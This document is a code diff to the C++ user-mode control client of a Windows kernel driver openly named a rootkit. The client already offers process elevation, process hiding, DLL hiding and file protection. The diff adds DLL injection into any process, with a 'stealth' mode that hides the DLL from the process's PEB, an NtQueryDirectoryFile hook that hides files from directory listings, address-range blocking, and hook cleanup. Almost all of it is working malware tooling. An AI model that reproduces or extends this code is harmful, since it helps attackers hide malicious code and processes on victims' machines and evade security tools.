@@ -1,10 +1,15 @@
 ﻿#include <iostream>
 #include <string>
 #include <Windows.h>
-
+#include <sstream>
 #define SHARED_MEM_SIZE 512
 #define SECTION_NAME L"MySharedSection"
 #define EVENT_NAME   L"MySharedEvent"
+
+typedef struct _ADDRESS_RANGE {
+    UINT64 Start;
+    UINT64 End;
+} ADDRESS_RANGE;
 
 namespace Rootkit {
     namespace codes {
@@ -31,28 +36,168 @@ namespace Rootkit {
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x705, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
         constexpr ULONG DisableProtectionToAll =
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x706, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        /*(
+        constexpr ULONG HideFile =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x707, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+            */
+        constexpr ULONG InjectDLL =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x708, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        constexpr ULONG BlockAddress =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x709, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        /*
+        constexpr ULONG HookNtCreateFile =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x710, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+            */
+        constexpr ULONG HookNtQueryDirectoryFile =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x711, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        constexpr ULONG DeleteAllHooks =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
     }
+
     struct Request {
         HANDLE process_id;
         WCHAR DLLName[256];
         WCHAR Path[MAX_PATH];
+        WCHAR Filename[256];
+        ADDRESS_RANGE addressToBlock;
+        bool stealth;
     };
 
 
     bool HideTheDriver(HANDLE driver_handle) {
         DWORD bytes_returned = 0;
+        Request r;
+        r.process_id = UlongToHandle(0);
         // Properly declare all parameters for DeviceIoControl
         return DeviceIoControl(
             driver_handle,                // Handle to device
             codes::HideDriver,            // Control code
-            nullptr,                      // Input buffer
-            0,                           // Input buffer size
-            nullptr,                      // Output buffer
-            0,                           // Output buffer size
+            &r,                      // Input buffer
+            sizeof(r),                           // Input buffer size
+            &r,                      // Output buffer
+            sizeof(r),                           // Output buffer size
             &bytes_returned,             // Bytes returned
             nullptr                      // Overlapped
         );
 
+    }
+    
+    bool HideFile(HANDLE driver_handle, WCHAR* Filename) {
+        Request r;
+        wcsncpy_s(
+            r.Filename,
+            _countof(r.Filename),        // size of r.Path in WCHARs
+            Filename,                    // source
+            _TRUNCATE                // max to copy
+        );
+        return DeviceIoControl(
+            driver_handle,
+            codes::HookNtQueryDirectoryFile,
+            &r,
+            sizeof(r),
+            &r,
+            sizeof(r),
+            nullptr,
+            nullptr
+        );
+    }
+
+    /*
+    bool HideFile(HANDLE driver_handle, WCHAR* Path) {
+        Request req = {};
+        DWORD ret = 0;
+
+        // Safe copy
+        wcsncpy_s(req.Path, _countof(req.Path), Path, _TRUNCATE);
+
+        // Send only input (no output buffer)
+        return DeviceIoControl(
+            driver_handle,
+            Rootkit::codes::HideFile,
+            &req,
+            sizeof(req),
+            nullptr,        // <-- no output buffer
+            0,              // <-- size 0
+            &ret,
+            nullptr
+        );
+    }
+    */
+    /*
+    bool HookNtCreateFile(HANDLE driver_handle) {
+        Request r;
+        r.process_id = UlongToHandle(0);
+        return DeviceIoControl(
+            driver_handle,
+            codes::HookNtCreateFile,
+            &r,
+            sizeof(r),
+            &r,
+            sizeof(r),
+            nullptr,
+            nullptr
+        );
+    }
+    */
+
+
+
+    bool DeleteAllHooks(HANDLE driver_handle) {
+        Request r;
+        r.process_id = UlongToHandle(0);
+        return DeviceIoControl(
+            driver_handle,
+            codes::DeleteAllHooks,
+            &r,
+            sizeof(r),
+            &r,
+            sizeof(r),
+            nullptr,
+            nullptr
+        );
+    }
+
+    bool BlockAddress(HANDLE driver_handle, ADDRESS_RANGE addressToBlock) {
+        DWORD bytes_returned = 0;
+        // Properly declare all parameters for DeviceIoControl
+        Request r;
+        r.addressToBlock = addressToBlock;
+        return DeviceIoControl(
+            driver_handle,
+            codes::BlockAddress,
+            &r,
+            sizeof(r),
+            &r,
+            sizeof(r),
+            nullptr,
+            nullptr
+        );
+
+    }
+
+    bool InjectDLL(HANDLE driver_handle, WCHAR* path, DWORD pid, bool stealth) {
+        Request r;
+        r.process_id = UlongToHandle(pid);
+        if (stealth) {
+            r.stealth = true;
+        }
+        // Correct copy into Path
+        wcsncpy_s(
+            r.Path,
+            _countof(r.Path),        // size of r.Path in WCHARs
+            path,                    // source
+            _TRUNCATE                // max to copy
+        );
+        return DeviceIoControl(
+            driver_handle,
+            codes::InjectDLL,
+            &r,
+            sizeof(r),
+            &r,
+            sizeof(r),
+            nullptr,
+            nullptr
+        );
     }
 
     bool UnProtectProcessOP(HANDLE driver_handle, DWORD pid) {
@@ -104,8 +249,12 @@ namespace Rootkit {
     bool HideDLL(HANDLE driver_handle, DWORD pid, WCHAR* DLLName) {
         Request r;
         r.process_id = UlongToHandle(pid);
-        wcsncpy_s(r.DLLName, DLLName, _TRUNCATE); // Safely copy the DLLName into r.DLLName
-
+        wcsncpy_s(
+            r.DLLName,
+            _countof(r.DLLName),
+            DLLName,
+            _TRUNCATE
+        );
         return DeviceIoControl(
             driver_handle,
             codes::HideDLL,
@@ -225,6 +374,59 @@ namespace Rootkit {
 std::string g_MsgFromKernel;
 
 
+bool AskForStealth() {
+    std::wstring response;
+
+    while (true) {
+        std::wcout << L"Would you like to enable the stealth version (hides the DLL from the process PEB)? Yes/No: ";
+        std::getline(std::wcin, response);
+
+        // Convert to lowercase
+        for (auto& ch : response) ch = towlower(ch);
+
+        if (response == L"yes" || response == L"y")
+            return true;
+        else if (response == L"no" || response == L"n")
+            return false;
+        else
+            std::wcout << L"[!] Invalid input. Please type Yes or No.\n";
+    }
+}
+ADDRESS_RANGE ReadHexAddressRange() {
+    std::string input;
+    std::getline(std::cin, input);  // read whole line, including '-'
+
+    // Find the dash separator
+    size_t dashPos = input.find('-');
+    if (dashPos == std::string::npos) {
+        // No dash found — handle error or assume Start=End=input?
+        std::cerr << "Invalid input format, expected start-end\n";
+        return { 0, 0 };
+    }
+
+    // Extract start and end substrings
+    std::string startStr = input.substr(0, dashPos);
+    std::string endStr = input.substr(dashPos + 1);
+
+    // Helper lambda to parse single hex string to UINT64
+    auto parseHex = [](const std::string& str) -> UINT64 {
+        std::string s = str;
+        // Remove 0x/0X prefix if present
+        if (s.find("0x") == 0 || s.find("0X") == 0)
+            s = s.substr(2);
+        UINT64 val = 0;
+        std::stringstream ss;
+        ss << std::hex << s;
+        ss >> val;
+        return val;
+        };
+
+    UINT64 startVal = parseHex(startStr);
+    UINT64 endVal = parseHex(endStr);
+
+    return { startVal, endVal };
+}
+
 void showMenu() {
     int pid = GetCurrentProcessId();
     std::cout << "===== User Mode Menu =====\n";
@@ -232,8 +434,10 @@ void showMenu() {
     std::cout << "2. Elevate Process\n";
     std::cout << "3. Hide Process\n";
     std::cout << "4. Protect Process\n";
-    std::cout << "5. Hide DLL from process.\n";
+    std::cout << "5. Hide DLL from process\n";
     std::cout << "6. File Protection Menu\n";
+    std::cout << "7. DLL Injector\n";
+    std::cout << "8. Hooking Utils\n";
     std::cout << "99. Exit\n";
     std::cout << "Current PID: " << pid << std::endl;
     if (!g_MsgFromKernel.empty() && g_MsgFromKernel[0] != '\0') {
@@ -306,7 +510,7 @@ int main() {
     WCHAR Path[MAX_PATH];
     std::wstring tempDLLName;
     WCHAR FilePath[MAX_PATH];
-
+    UINT64 addressToBlock;
     while (true) {
         showMenu();
         std::cin >> choice;
@@ -500,7 +704,7 @@ int main() {
                 std::cout << "1) Enable File Protection (Prevents Deletion)\n";
                 std::cout << "2) Disable File Protection (Allows Deletion)\n";
                 std::cout << "3) Clear All File Protections\n";
-                std::cout << "    Enter '99' for a detailed explanation\n";
+                std::cout << "------> Enter '99' for a detailed explanation\n";
                 std::cout << "4) Return to Main Menu\n";
                 std::cout << "===========================\n";
                 std::cout << "Enter a choice: ";
@@ -555,7 +759,7 @@ int main() {
                 case 99:
                     system("cls");
                     std::cout << "File Protection Explanation:\n";
-                    std::cout << "1) Enable File Protection: Prevents the specified file from being deleted or modified by unauthorized processes.\n";
+                    std::cout << "1) Enable File Protection: Prevents the specified file from being deleted or modified.\n";
                     std::cout << "2) Disable File Protection: Removes protection, allowing the file to be deleted or modified.\n";
                     std::cout << "3) Clear All File Protections: Removes protection from all files previously protected by the driver.\n";
                     std::cout << "This feature is useful for safeguarding critical files from tampering or accidental deletion.\n\n";
@@ -573,6 +777,66 @@ int main() {
                 }
             }
             break;
+        }
+        
+        case 7: {
+            std::wcin.ignore();
+            std::wcout << L"Enter a full DLL path (e.g., C:\\Users\\User\\Desktop\\mal.dll): ";
+            std::wcin.getline(FilePath, MAX_PATH);
+            std::wcout << L"Enter a PID: ";
+            std::cin >> pid;
+            bool stealth = AskForStealth();
+            std::wcout << L"[!] Sending Message to Driver.\n";
+            Rootkit::InjectDLL(driver_handle, FilePath, pid, stealth);
+            std::cout << "[+] Waiting for message from kernel...\n";
+            WaitForSingleObject(hEvent, 10000);
+            if (pView && ((char*)pView)[0] != '\0') {
+                printf("[+] Message From Kernel: %s\n", (char*)pView);
+                g_MsgFromKernel = std::string((char*)pView);
+            }
+            else {
+                printf("No message has been received from the kernel...\n");
+            }
+            Sleep(5000);
+            break;
+        }
+        case 8: {
+            if (!enabled) {
+                enabled = !enabled;
+            }
+            while (enabled) {
+                system("cls");
+                std::cout << "=== HOOKING UTILS ===\n";
+                std::cout << "1. Block Address Ranges\n";
+                std::cout << "2. Hide File\n";
+                std::cout << "3. Delete all hooks and revert.\n";
+                std::cout << "===========================\n";
+                std::cout << "Enter a choice: ";
+                std::cin >> choiceProtect;
+
+                switch (choiceProtect) {
+                case 1:
+                    std::cout << "Enter address range to block (hex e.g 0x1000-0x2000): ";
+                    ADDRESS_RANGE addressToBlock = ReadHexAddressRange();
+                    std::wcout << L"\n[!] Sending Message to Driver.\n";
+                    Rootkit::BlockAddress(driver_handle, addressToBlock);
+                    Sleep(5000);
+                    break;
+                case 2:
+                    std::wcin.ignore();
+                    std::wcout << L"Enter the filename you would like to hide: ";
+                    std::wcin.getline(FilePath, 256);
+                    std::wcout << L"\n[!] Sending Message to Driver.\n";
+                    Rootkit::HideFile(driver_handle, FilePath); //TODO: Instead of filtering by filename, filter by full path.
+                    Sleep(5000);
+                    break;
+                case 3:
+                    std::wcout << L"\n[!] Sending Message to Driver.\n";
+                    Rootkit::DeleteAllHooks(driver_handle);
+                    Sleep(5000);
+                    break;
+                }
+            }
         }
         case 99: {
             std::cout << "Exiting the program, bye!\n";
